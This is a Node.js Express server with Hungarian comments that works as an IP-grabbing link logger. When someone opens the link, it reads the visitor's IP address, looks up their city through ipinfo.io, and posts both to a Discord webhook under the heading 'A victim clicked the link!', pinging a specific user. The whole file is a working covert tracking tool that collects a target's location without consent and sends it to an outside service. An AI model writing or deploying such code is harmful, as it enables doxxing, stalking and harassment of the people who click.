// server.js

const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok
app.use(express.static(path.join(__dirname, 'public')));

// Webhook URL és IPINFO token a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const ipinfoToken = process.env.IPINFO_TOKEN;

// /get-webhook-url útvonal a webhook URL elküldéséhez
app.get('/get-webhook-url', (req, res) => {
    res.json({ webhookUrl });
});

// /send-ip útvonal
app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    try {
        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
        const geoData = geoResponse.data;

        const message = {
            username: "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: `<@1095731086513930260>`,
            embeds: [{
                title: "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${userIp}\n**Város >>** ${geoData.city || 'N/A'}`,
                color: 0x800080
            }]
        };

        await axios.post(webhookUrl, message);
        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

// Alapértelmezett útvonal, hogy kiszolgálja az index.html-t
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
